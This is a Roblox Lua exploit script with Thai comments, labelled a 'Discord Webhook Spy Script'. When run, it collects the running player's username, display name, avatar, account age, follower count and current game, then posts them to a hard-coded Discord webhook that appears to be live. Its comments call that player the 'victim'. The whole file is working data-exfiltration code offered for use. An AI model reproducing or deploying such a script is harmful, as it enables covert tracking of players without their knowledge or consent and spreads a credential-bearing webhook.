-- 🌙 [Exploiter's Whisper] - Discord Webhook Spy Script
-- ส่งข้อมูลเหยื่อไปยังดิสคอร์ดแบบเรียลไทม์! 🔔

local WebhookURL = "https://discord.com/api/webhooks/1438458205972992032/HS-8KL6HexfK5KwKCtU27DfoI8ipqYZ6qrijyqxyningvBezjWDhe5-30YBH5kwg6U--" -- 🔗 ใส่ webhook ของนายที่นี่!

local function sendToDiscord(data)
    local payload = {
        ["content"] = "",
        ["embeds"] = {{
            ["title"] = "🎯 **เหยื่อถูกล็อกเป้าแล้ว!**",
            ["description"] = "สคริปต์ถูกเรียกใช้งานโดยผู้เล่นคนนี้!",
            ["color"] = 16711680, -- สีแดงเลือด 💉
            ["fields"] = {
                {["name"] = "👤 ชื่อในเกม", ["value"] = data.Username, ["inline"] = true},
                {["name"] = "🦸 ชื่อเล่น", ["value"] = data.DisplayName or "ไม่มี", ["inline"] = true},
                {["name"] = "🎮 รูปตัวละคร", ["value"] = "[คลิกดูรูป]("..data.AvatarURL..")", ["inline"] = false},
                {["name"] = "🎂 อายุบัญชี", ["value"] = data.AccountAge.." วัน", ["inline"] = true},
                {["name"] = "❤️ ผู้ติดตาม", ["value"] = tostring(data.Followers).." คน", ["inline"] = true},
                {["name"] = "🗺️ แมพที่เล่น", ["value"] = data.CurrentPlace, ["inline"] = false},
            },
            ["footer"] = {["text"] = "Exploiter System • รันเมื่อ: "..os.date("%H:%M:%S")},
            ["thumbnail"] = {["url"] = data.AvatarURL}
        }}
    }

    local success, err = pcall(function()
        request = request or syn.request or http_request
        request({
            Url = WebhookURL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode(payload)
        })
    end)

    if not success then
        warn("❌ ส่งข้อมูลล้มเหลว! Error: "..tostring(err))
    else
        print("✅ ข้อมูลถูกส่งไปยัง Discord แล้ว!")
    end
end

-- 🔍 ดึงข้อมูลผู้เล่น
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:FindFirstChildOfClass("Humanoid")

-- รูปตัวละคร (thumbnail)
local thumbType = Enum.ThumbnailType.AvatarBust
local thumbSize = Enum.ThumbnailSize.Size420x420
local content, isReady = game.Players:GetUserThumbnailAsync(player.UserId, thumbType, thumbSize)

-- ดึงข้อมูลแมพ
local placeId = game.PlaceId
local placeName = "ไม่ทราบ"
pcall(function()
    local info = game:GetService("MarketplaceService"):GetProductInfo(placeId)
    placeName = info.Name
end)

-- 📦 สร้างแพ็กเกจข้อมูล
local victimData = {
    Username = player.Name,
    DisplayName = player.DisplayName,
    AvatarURL = content,
    AccountAge = player.AccountAge,
    Followers = player.FollowerCount or player.Followers or "ไม่ทราบ",
    CurrentPlace = placeName .. " (`"..placeId.."`)",
}

-- 🚀 ส่งข้อมูลทันที!
spawn(function()
    wait(2) -- รอให้โหลดครบ
    sendToDiscord(victimData)
end)
